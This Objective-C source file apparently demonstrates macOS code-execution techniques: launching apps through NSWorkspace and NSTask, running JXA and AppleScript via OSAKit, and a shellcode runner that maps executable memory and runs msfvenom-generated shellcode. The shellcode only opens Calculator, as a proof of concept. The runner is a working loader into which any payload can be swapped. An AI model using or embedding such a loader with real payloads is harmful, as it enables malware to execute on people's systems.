//
//  main.m
//  ObjC_Exec
//
//  Created by david on 9/22/20.
//

#import <Cocoa/Cocoa.h>
#import <OSAKit/OSAKit.h>

//uses NSWorkspace class to start an .app
int AppNoArgs() {
    if(![[NSWorkspace sharedWorkspace] launchApplication:@"/System/Applications/Calculator.app"])
        NSLog(@"Path Finder failed to launch");
    return 0;
}

//uses NSWorkspace class to start an .app, with arguments
int AppWithArgs() {
    NSWorkspace *workspace = [NSWorkspace sharedWorkspace];
    NSURL *url = [NSURL fileURLWithPath:[workspace fullPathForApplication:@"Path Finder"]];
    //Handle url==nil
    NSError *error = nil;
    NSArray *arguments = [NSArray arrayWithObjects:@"Argument1", @"Argument2", nil];
    [workspace launchApplicationAtURL:url options:0 configuration:[NSDictionary dictionaryWithObject:arguments forKey:NSWorkspaceLaunchConfigurationArguments] error:&error];
    //Handle error
    return 0;
}

//uses NSTask class to run a program/execute a shell command
//stolen from https://stackoverflow.com/a/412573/2920963
int BinWithArgs() {
    int pid = [[NSProcessInfo processInfo] processIdentifier];
    NSPipe *pipe = [NSPipe pipe];
    NSFileHandle *file = pipe.fileHandleForReading;

    NSTask *task = [[NSTask alloc] init];
    task.launchPath = @"/usr/bin/open";
    task.arguments = @[@"/System/Applications/Calculator.app"];
    //task.arguments = @[@"foo", @"bar.txt"];

    task.standardOutput = pipe;

    [task launch];

    NSData *data = [file readDataToEndOfFile];
    [file closeFile];

    NSString *grepOutput = [[NSString alloc] initWithData: data encoding: NSUTF8StringEncoding];
    NSLog (@"returned:\n%@", grepOutput);
    
    return 0;
}

// from https://github.com/Hammerspoon/hammerspoon/blob/master/extensions/osascript/internal.m
int JXAExec() {
    NSString *script = @"var calc = Application('Calculator');calc.activate();";
    
    OSAScript *osa = [[OSAScript alloc] initWithSource:script language:[OSALanguage languageForName:@"JavaScript"]];
    NSDictionary *__autoreleasing compileError;
    [osa compileAndReturnError:&compileError];
    if (compileError) {
        return 1;
    }
    
    NSDictionary *__autoreleasing error;
        NSAppleEventDescriptor* result = [osa executeAndReturnError:&error];
        BOOL didSucceed = (result != nil);
    
    return didSucceed;
    
}

int OSAExecShort() {


    NSString *script = @"activate application \"Calculator\"";
    OSAScript *osa= [[OSAScript alloc] initWithSource:script];
    NSDictionary * errorDict = nil;
    NSAppleEventDescriptor * returnDescriptor = [osa executeAndReturnError: &errorDict];
    NSLog(@"%@", returnDescriptor);
    return 0;
}

//SHELLCODE RUNNER
//Runs some shellcode in the current thread
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
int (*sc)();
//msfvenom -p osx/x64/exec CMD='/usr/bin/open /System/Applications/Calculator.app' -f c -b '\x00
unsigned char shellcode[] =
"\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x29\x67\xb4\x70\x5c\x89\x13\xcd\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x61\x56\x66\x98\x6e\x89"
"\x13\xcd\x06\x12\xc7\x02\x73\xeb\x7a\xa3\x06\x08\xc4\x15\x32"
"\x89\x3c\x9e\x50\x14\xc0\x15\x31\xa6\x52\xbd\x59\x0b\xdd\x13"
"\x3d\xfd\x7a\xa2\x47\x14\x9b\x33\x3d\xe5\x70\xb8\x45\x06\xc0"
"\x1f\x2e\xa7\x72\xbd\x59\x67\xeb\x38\xd5\x70\x41\x85\xa8\xa6"
"\xba\x70\x5c\x89\x42\x9a\x61\xee\x52\x38\x9b\x49\x28\xcd\x29"
"\x65\xbb\x75\x5c\x89\x13\xcd";
int RunShellcode() {
    
    
    void *ptr = mmap(0, 0x22, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
                      | MAP_PRIVATE, -1, 0);
           
              if (ptr == MAP_FAILED) {
                  perror("mmap");
                  exit(-1);
              }
           
              memcpy(ptr, shellcode, sizeof(shellcode));
              sc = ptr;
           
              sc();
           
              return 0;

}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // Setup code that might create autoreleased objects goes here.
    }

    int ret = JXAExec();
    if (ret != 0) {
        NSLog(@"FAILURE");
    }
    
    return NSApplicationMain(argc, argv);
}
